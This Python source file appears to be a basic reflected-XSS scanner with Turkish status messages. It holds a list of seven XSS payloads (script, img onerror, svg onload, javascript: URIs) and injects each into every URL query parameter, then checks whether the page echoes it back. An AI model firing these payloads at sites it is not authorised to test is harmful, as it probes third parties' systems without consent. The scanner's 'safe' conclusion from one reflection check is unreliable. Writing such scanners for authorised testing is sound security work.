
import requests
from urllib.parse import urlparse, parse_qs, urlencode

xss_payloads = [
    "<script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "\"><svg/onload=alert(1337)>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<math><mi//xlink:href=javascript:alert(1)>"
]

def scan_xss(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    if not query_params:
        return {"status": "info", "explanation": "XSS taraması için parametre bulunamadı."}

    vulnerable = False
    for param in query_params:
        for payload in xss_payloads:
            test_params = {**query_params}
            test_params[param] = payload
            test_query = urlencode(test_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{test_query}"

            try:
                r = requests.get(test_url, timeout=5)
                if payload in r.text:
                    return {
                        "status": "vulnerable",
                        "explanation": f"XSS açığı tespit edildi! Sayfa gönderilen script'i filtrelemiyor.",
                        "payload": payload
                    }
            except requests.RequestException:
                continue

    return {
        "status": "safe",
        "explanation": "XSS açığı tespit edilmedi. Sayfa gelen veriyi düzgün şekilde filtreliyor."
    }
